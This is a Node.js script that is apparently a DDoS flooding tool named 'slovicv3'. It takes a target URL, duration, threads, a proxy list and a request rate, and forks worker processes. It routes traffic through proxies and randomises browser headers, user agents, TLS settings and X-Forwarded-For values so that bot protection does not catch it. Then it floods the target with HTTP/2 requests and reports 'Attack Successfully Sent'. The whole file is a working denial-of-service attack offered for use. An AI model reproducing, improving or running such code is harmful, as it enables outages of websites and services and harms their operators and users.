const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  cluster = require('cluster')
const crypto = require('crypto');
const dns = require('dns');
const util = require('util');
const os = require("os");
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
//	console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
  var colors = require('colors');
} catch (err) {
  console.log('\x1b[36mInstalling\x1b[37m the requirements');
  execSync('npm install colors');
  console.log('Done.');
  process.exit();
}
      const acceptedLocales = [
      'en-au',
      'en-ca',
      'en-gb',
      'en-in',
      'en-us',
      'de-de',
      'es-es',
      'fr-fr',
      'it-it',
      'ja-jp',
      'ko-kr',
      'pt-br',
      'zh-tw',
      'zh-cn',
      'zh-hans-cn',
    ];
    const orphanLocales = [
      'ru-ru',
      'es-la',
      'sv-se',
      'nl-nl',
      'vi-vn',
      'th-th',
      'id-id',
      'tr-tr',
      'el-gr',
      'nb-no',
      'pl-pl'
    ];
    const ignoreList = [
      'apps',
      'docs',
      'rate-limit-test',
      'rss',
    ];
cplist = ['TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_CCM_8_SHA256', 'TLS_AES_128_CCM_SHA256', 'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', ]
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'], ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
function generateRandomDataChunk() {
    const megabyte = 1024 * 1024; // 1 megabyte
    const chunkSizeInBytes = 500 * megabyte; // 1024MB chunk size

    const randomData = crypto.randomBytes(chunkSizeInBytes);
    return randomData;
}

// Example of sending a 1024MB (1GB) chunk of random data
const chunk = generateRandomDataChunk();
const weightValues = [1, 220, 255, 256];
const randList = list => list[Math.floor(Math.random() * list.length)];
const headerFunc = {
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  },
}
process.on('uncaughtException', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = 'bypass';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
  console.log(`Example: node slovicv3 url time thread proxy.txt rate query(true/false)`.rainbow);
  process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('sent with http:// or https://');
  process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.match(/\S+/g);
} catch (err) {
  console.error('Error proxy file:', err.message);
  process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('number rps');
  process.exit(1);
}
const proxyr = () => {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

function shuffleObject(obj) {
  const keys = Object.keys(obj);
  const shuffledKeys = keys.reduce((acc, _, index, array) => {
    const randomIndex = Math.floor(Math.random() * (index + 1));
    acc[index] = acc[randomIndex];
    acc[randomIndex] = keys[index];
    return acc;
  }, []);
  const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
  return shuffledObject;
}
const MAX_RAM_PERCENTAGE = 70;
const RESTART_DELAY = 100;
let postData
let post
if (cluster.isMaster) {
  console.clear()
  console.log(`   -   Status    : [ \x1b[32mAttack Successfully Sent\x1b[0m ]`)
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log('[>] Restarting ', RESTART_DELAY, 'ms...');
    setTimeout(() => {
      for (let counter = 1; counter <= thread; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };
  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
      restartScript();
    }
  };
  const argsa = process.argv.slice(7);
  const queryIndexa = argsa.indexOf('--post');
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  if (post === 'true') {
    argsq = process.argv.slice(7);
    const dataIndex = argsq.indexOf('--data');
    postData = dataIndex !== -1 ? argsq[dataIndex + 1] : null;
    if (postData === null || postData.trim() === '') {
      console.log("Require post data");
      process.exit();
    } else {
      // console.log('POST MODE');
    }
  } else {
   // console.log('GET MODE');
  }
  setInterval(handleRAMUsage, 1000);
  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-1), time * 1000);
} else {
  if (input === 'bypass') {
    const abu = setInterval(function() {
      flood()
    }, 1);
  } else {
    setInterval(flood)
  }
}
async function flood() {
  var parsed = url.parse(target);
  var cipper = headerFunc.cipher();
  var proxy = proxyr().split(':');
  let interval
  if (input === 'flood') {
    interval = 1000;
  } else if (input === 'bypass') {
    function randomDelay(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    interval = randomDelay(500, 1000);
  } else {
    interval = 1000;
  }
  var operatingSystems = ["Windows NT 10.0"];
  var architectures = {
    "Windows NT 10.0": `Win64; x64`,
    "X11": "Linux x86_64"
  };
  const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
const httpport = [
  "110",
  "143",
  "220",
  "5432",
  "993",
  "587",
  "995",
  "22",
  "3306",
  "465",
]
  var browsers = ["Chrome/122.0.0.0 Safari/537.36", "Chrome/121.0.0.0 Safari/537.36", "Chrome/120.0.0.0 Safari/537.36", "Chrome/119.0.0.0 Safari/537.36" ];

  function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  const randomOS = getRandomValue(operatingSystems);
  const randomArch = architectures[randomOS];
  const randomBrowser = getRandomValue(browsers);
  //console.log(uas)
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }

  function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }

  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  //random object
  const agent = await new http.Agent({
    host: proxy[0],
    port: proxy[1],
    keepAlive: true,
    keepAliveMsecs: 500000000,
    maxSockets: 50000,
    maxTotalSockets: 100000,
  });
  const Optionsreq = {
    agent: agent,
    method: 'CONNECT',
    path: parsed.host + ':443',
    timeout: 1000,
    headers: {
      'Host': parsed.host,
      'Proxy-Connection': 'Keep-Alive',
      'Connection': 'Keep-Alive',
      'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
    },
  };
  connection = await http.request(Optionsreq, (res) => {});
  connection.on('error', (err) => {
    if (err) return
  });
  connection.on('timeout', async () => {
    return
  });
  	const plat = [
		"\"Windows\"",
		"\"Linux\"",
		"\"Android\"",
		"\"iOS\"",
		"\"Mac OS\"",
		"\"iPadOS\"",
		"\"BlackBerry OS\"",
		"\"Firefox OS\"",
	];
  const Methods = [
  "GET",
  "HEAD",
  "POST",
  "PUT",
  "DELETE",
  "CONNECT",
  "OPTIONS",
  "TRACE",
  "PATCH",
];
 mixmethods = Methods[Math.floor(Math.random() * Methods.length)]
  const args = process.argv.slice(7);
  const queryIndex = args.indexOf('--query');
  const query = queryIndex !== -1 ? args[queryIndex + 1] : null;
  const argsa = process.argv.slice(7);
  const queryIndexa = argsa.indexOf('--post');
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  const bypass = process.argv.slice(2);
  const bypassindex = bypass.indexOf('--randuser');
  const index = bypassindex !== -1 ? bypass[bypassindex + 1] : null;
  const max = index || 'false'
  let passedrand
  let uas
  clength = urihost[Math.floor(Math.random() * urihost.length)]
  hp = httpport[Math.floor(Math.random() * httpport.length)]
  if (max !=='true'){
  uas = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) ${randomBrowser}`
}else{
  uas = generateRandomString(5, 7) + `Mozilla/5.0 (Windows NT ${randnum(0,10)}.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) ${randomBrowser}` + getRandomInt(100, 99999) + '.' + getRandomInt(100, 99999)
}
  const secdata = {
    "sec-fetch-mode": Math.random() <0.75 ?"navigate; navigate":"navigate",
    "sec-fetch-user": Math.random() <0.75 ?"?1;?1":"?1",
  }
  const secdata2 = {
    "sec-fetch-site":Math.random() <0.75 ? "none;none": "none",
    
  }

  const header = {
    
		"sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : '?1',
		"Sec-Ch-Ua-Platform": getRandomValue(plat) + (Math.random() < 0.5 ? '\"' + generateRandomString(1, 10) : ''),
 ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
 ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : { }),
    'user-agent': uas,
    ...(Math.random() < 0.75 ?{"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;q=0.7"}:{}),
    ...(Math.random() < 0.75 ? secdata2 : {}),
    ...(Math.random() < 0.75 ? secdata : {}),
    "sec-fetch-dest":  Math.random() <0.75 ? "document" : "document; document",
    ...(Math.random() < 0.5 ? { ['BLOSMA' + generateRandomString(1, 4)]: "document" + generateRandomString(1, 5) } : {}),
     ...(Math.random() < 0.5 ? {"sec-ch-ua": `\\\\"Not_A Brand\\\\";v=\\\\"${getRandomInt(121,345)}\\\\", \\\\"Chromium\\\\";v=\\\\"${getRandomInt(421,6345)}\\\\", \\\\"Google Chrome\\\\";v=\\\\"${getRandomInt(421,7124356)}\\\\\\`} : {}),

  };

  dynHeaders = {
    ...(Math.random() < 0.5 ?{['x-sec-width-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
  ...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
   ['x-c-python-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12),
    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    ...(Math.random() < 0.75 ?{"referer": "https:/" +clength} :{}),
    ...(Math.random() < 0.75 ?{"origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
    ...(Math.random() < 0.75 ?{"x-requested-with": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
    ...(Math.random() < 0.75 ?{"cookie":""}:{}),
     ...(Math.random() < 0.5 ? {"x-botnet-tag": "RATE"}: {}),
     "ignoreList": ignoreList[Math.floor(Math.floor(Math.random() * ignoreList.length))],
     "orphan-Locales": orphanLocales[Math.floor(Math.floor(Math.random()* orphanLocales.length))],
     "accepted-Locales" : acceptedLocales[Math.floor(Math.floor(Math.random() * acceptedLocales.length))],
  
  }
  

  cipor = cplist.join(':')
  const TLSOPTION = {
    ...(Math.random() < 0.5 ? {
      ciphers: 'TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:TLS_AES_128_CCM_SHA256'
    } : {
      cipher: cipor
    }),
    
      secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
   
    ...(Math.random() < 0.5 ? {
      echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448"
    } : {
      echdCurve: "secp256r1:X25519;"
    }),
    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
    secure: true,
    rejectUnauthorized: false,
     ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
        challengeToSolve: 5,
       clientTimeout: 5000,
       maxRedirects: 10,
       clientlareMaxTimeout: 15000,
       highWaterMark: 16*2010,
    
      secureOptions:  crypto.constants.SSL_OP_NO_SSLv2 |crypto.constants.SSL_OP_NO_SSLv3 |crypto.constants.SSL_OP_NO_TLSv1 |crypto.constants.SSL_OP_NO_TLSv1_1 |crypto.constants.SSL_OP_NO_TLSv1_3 |crypto.constants.ALPN_ENABLED |crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |crypto.constants.SSL_OP_COOKIE_EXCHANGE |crypto.constants.SSL_OP_PKCS1_CHECK_1 |crypto.constants.SSL_OP_PKCS1_CHECK_2 |crypto.constants.SSL_OP_SINGLE_DH_USE |crypto.constants.SSL_OP_SINGLE_ECDH_USE |crypto.constants.SSL_OP_NO_RENEGOTIATION |crypto.constants.SSL_OP_NO_TICKET |crypto.constants.SSL_OP_NO_COMPRESSION |crypto.constants.SSL_OP_NO_RENEGOTIATION |crypto.constants.SSL_OP_TLSEXT_PADDING |crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION
   
  };
  async function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = await tls.connect({
      ...TLSOPTION,
      host: parsed.host,
      port: 443,
      servername: parsed.host,
      socket: socket
    });
    return tlsSocket;
  }
  connection.on('connect', async function(res, socket) {
    pasi = Math.random() < 0.5 ? 15663105 : 0
    const tlsSocket = await createCustomTLSSocket(parsed, socket);
    const client = await http2.connect(parsed.href, {
      createConnection: () => tlsSocket,
      settings: {
        ...(Math.random() < 0.5 ? {
          headerTableSize: 65536
        } : {}),
        enablePush: false,
        enableConnectProtocol : false,
        enableOrigin :true,
        enableH2cUpgrade :true,
      rejectUnauthorized : false,
      allowHTTP1 : true,
        ...(Math.random() < 0.5 ? {
          maxConcurrentStreams: 100
        } : {}),
        ...(Math.random() < 0.5 ? {
          initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432
        } : {}),
        ...(Math.random() < 0.5 ? {
          maxFrameSize: 16384
        } : {}),
        ...(Math.random() < 0.5 ? {
          maxHeaderListSize: 262144
        } : {}),
      },
    }, (session) => {
      session.setLocalWindowSize(15663105);
    });
    client.on("connect", async () => {
      
      setInterval(async () => {
        for (let i = 0; i < rps; i++) {
          author = {
          ":method" : "GET",
            ...(post === 'true' ? {
              "content-length": "0"
            } : {}),
            ":authority": Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": 'https',
            ...(query === 'true' ? {
              ":path": parsed.path + '?' + 'data' + generateRandomString(0, 10) + '=' + generateRandomString(10, 20)
            } : {
              ":path": parsed.path
            }),
    					"x-forwarded-for": generateRandomString(5, 10) + "-type-" + getRandomInt(1, 25) + "-streamid-" + getRandomInt(1, 23) + "," + proxy[0],
          }
          head = header
          dyn = dynHeaders
          datas = await {
            ...author,
            ...head,
            ...dyn,
          }

          const request = await client.request(datas,  {waitForTrailers: (Math.random() < 0.5 ? true : false),endStream: false})
          const request1 = await client.request(datas, {waitForTrailers: (Math.random() < 0.5 ? true : false),endStream: false})
          const request2 = await client.request(datas, {waitForTrailers: (Math.random() < 0.5 ? true : false),endStream: false})
          request.end()
          request1.end()
          request2.end()
        }
      }, interval);
    });
    client.on("close", () => {
      client.destroy();
      tlsSocket.destroy();
      socket.destroy();
      return flood()
    });
    client.on('timeout', async () => {
      await client.destroy();
      await tlsSocket.destroy();
      await socket.destroy();
      return flood()
    });
    client.on("error", async (error) => {
      if (error) {
        await client.destroy();
        await tlsSocket.destroy();
        await socket.destroy();
        return flood()
      }
    });
  });
  connection.on('error', (error) => {
    connection.destroy();
    if (error) return;
  });
  connection.on('timeout', () => {
    connection.destroy();
    return
  });
  connection.end();
} //